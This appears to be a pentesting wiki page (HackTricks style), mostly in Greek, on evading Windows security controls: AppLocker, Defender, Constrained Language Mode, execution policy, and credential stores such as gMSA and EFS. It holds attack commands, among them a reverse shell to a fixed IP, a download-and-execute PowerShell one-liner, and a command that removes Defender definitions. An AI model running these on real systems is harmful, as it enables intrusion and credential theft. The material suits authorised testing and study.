# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

Μια λίστα λευκών εφαρμογών είναι μια λίστα εγκεκριμένων λογισμικών εφαρμογών ή εκτελέσιμων που επιτρέπεται να είναι παρόντα και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατευθεί το περιβάλλον από επιβλαβές κακόβουλο λογισμικό και μη εγκεκριμένο λογισμικό που δεν ευθυγραμμίζεται με τις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση λευκής λίστας εφαρμογών** της Microsoft και δίνει στους διαχειριστές συστημάτων έλεγχο πάνω σε **ποια εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** πάνω σε εκτελέσιμα, σενάρια, αρχεία εγκατάστασης Windows, DLLs, πακέτα εφαρμογών και εγκαταστάτες πακέτων εφαρμογών.\
Είναι κοινό για τους οργανισμούς να **μπλοκάρουν το cmd.exe και το PowerShell.exe** και την εγγραφή σε ορισμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Check

Έλεγχος ποια αρχεία/επέκταση είναι στη μαύρη/λευκή λίστα:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο για να αναθεωρήσετε το τρέχον σύνολο κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Παράκαμψη

- Χρήσιμες **Εγγράψιμες φακέλους** για να παρακάμψετε την πολιτική του AppLocker: Εάν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στο `C:\Windows\System32` ή `C:\Windows`, υπάρχουν **εγγράψιμοι φάκελοι** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτό**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Συνήθως **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κώδικες μπορούν επίσης να είναι χρήσιμοι για να παρακαμφθεί το AppLocker.
- **Κακώς γραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
- Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
- Οι οργανισμοί συχνά επικεντρώνονται στο **να μπλοκάρουν το `%System32%\WindowsPowerShell\v1.0\powershell.exe` εκτελέσιμο**, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
- **Η επιβολή DLL σπάνια είναι ενεργοποιημένη** λόγω του επιπλέον φορτίου που μπορεί να επιφέρει σε ένα σύστημα, και της ποσότητας δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σπάσει. Έτσι, η χρήση **DLLs ως πίσω πόρτες θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Αποθήκευση Διαπιστευτηρίων

### Διαχειριστής Λογαριασμών Ασφαλείας (SAM)

Τα τοπικά διαπιστευτήρια είναι παρόντα σε αυτό το αρχείο, οι κωδικοί πρόσβασης είναι κατακερματισμένοι.

### Τοπική Αρχή Ασφαλείας (LSA) - LSASS

Τα **διαπιστευτήρια** (κατακερματισμένα) είναι **αποθηκευμένα** στη **μνήμη** αυτού του υποσυστήματος για λόγους Ενιαίας Σύνδεσης.\
Η **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικών πρόσβασης, δικαιώματα χρηστών...), **αυθεντικοποίηση**, **tokens πρόσβασης**...\
Η LSA θα είναι αυτή που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο **αρχείο SAM** (για τοπική σύνδεση) και θα **μιλήσει** με τον **ελεγκτή τομέα** για να αυθεντικοποιήσει έναν χρήστη τομέα.

Τα **διαπιστευτήρια** είναι **αποθηκευμένα** μέσα στη **διαδικασία LSASS**: εισιτήρια Kerberos, κατακερματισμοί NT και LM, εύκολα αποκρυπτογραφημένοι κωδικοί πρόσβασης.

### Μυστικά LSA

Η LSA θα μπορούσε να αποθηκεύσει στο δίσκο κάποια διαπιστευτήρια:

- Κωδικός πρόσβασης του λογαριασμού υπολογιστή του Active Directory (μη προσβάσιμος ελεγκτής τομέα).
- Κωδικοί πρόσβασης των λογαριασμών υπηρεσιών Windows
- Κωδικοί πρόσβασης για προγραμματισμένα καθήκοντα
- Περισσότερα (κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Είναι παρούσα μόνο στους Ελεγκτές Τομέα.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, και σε εκδόσεις του Windows Server. **Μπλοκάρει** κοινά εργαλεία pentesting όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι προστασίες**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender** μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να δείτε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να το απαριθμήσετε μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios without user initiation** include:

- When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.
- Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.

This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.

**Key Takeaways**:

- EFS uses a symmetric FEK, encrypted with the user's public key.
- Decryption employs the user's private key to access the FEK.
- Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
- Encrypted files are accessible to the owner without additional steps.

### Check EFS info

Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Check **who** has **access** to the file using cipher /c \<file>\
You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files

### Decrypting EFS files

#### Being Authority System

This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token` from `incognito`). Or you could just `migrate` to process of the user.

#### Knowing the users password

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:

- **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key Distribution Service (KDC), eliminating the need for manual password updates.
- **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
- **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
- **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
- **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.

The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)

Επίσης, ελέγξτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **επίθεση NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.

## LAPS

Η **Λύση Κωδικού Πρόσβασης Τοπικού Διαχειριστή (LAPS)**, διαθέσιμη για λήψη από [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης τοπικών διαχειριστών. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **τακτικά αλλάζουν**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκείς άδειες, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης τοπικών διαχειριστών.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για τη χρήση του PowerShell αποτελεσματικά, όπως η μπλοκάρισμα COM αντικειμένων, η επιτρεπόμενη μόνο χρήση εγκεκριμένων τύπων .NET, ροές εργασίας βασισμένες σε XAML, κλάσεις PowerShell και άλλα.

### **Έλεγχος**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Παράκαμψη
```powershell
#Easy bypass
Powershell -version 2
```
Στα τρέχοντα Windows, αυτή η παράκαμψη δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωττίσετε, μπορεί να χρειαστεί** **να** _**Προσθέσετε μια Αναφορά**_ -> _Περιήγηση_ -> _Περιήγηση_ -> προσθέστε `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **να αλλάξετε το έργο σε .Net4.5**.

#### Άμεση παράκαμψη:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Αντίστροφη θήκη:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε τη περιορισμένη λειτουργία. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Πολιτική Εκτέλεσης PS

Από προεπιλογή είναι ρυθμισμένη σε **restricted.** Κύριοι τρόποι για να παρακάμψετε αυτή την πολιτική:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την αυθεντικοποίηση χρηστών.

Το SSPI θα είναι υπεύθυνο για την εύρεση του κατάλληλου πρωτοκόλλου για δύο μηχανές που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος γι' αυτό είναι το Kerberos. Στη συνέχεια, το SSPI θα διαπραγματευτεί ποιο πρωτόκολλο αυθεντικοποίησης θα χρησιμοποιηθεί, αυτά τα πρωτόκολλα αυθεντικοποίησης ονομάζονται Security Support Provider (SSP), βρίσκονται μέσα σε κάθε μηχανή Windows με τη μορφή DLL και και οι δύο μηχανές πρέπει να υποστηρίζουν το ίδιο για να μπορέσουν να επικοινωνήσουν.

### Main SSPs

- **Kerberos**: Το προτιμώμενο
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Λόγοι συμβατότητας
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers και LDAP, κωδικός πρόσβασης σε μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για να διαπραγματευτεί το πρωτόκολλο που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί μια **προτροπή συγκατάθεσης για ανυψωμένες δραστηριότητες**.

{{#ref}}
windows-security-controls/uac-user-account-control.md
{{#endref}}

{{#include ../banners/hacktricks-training.md}}
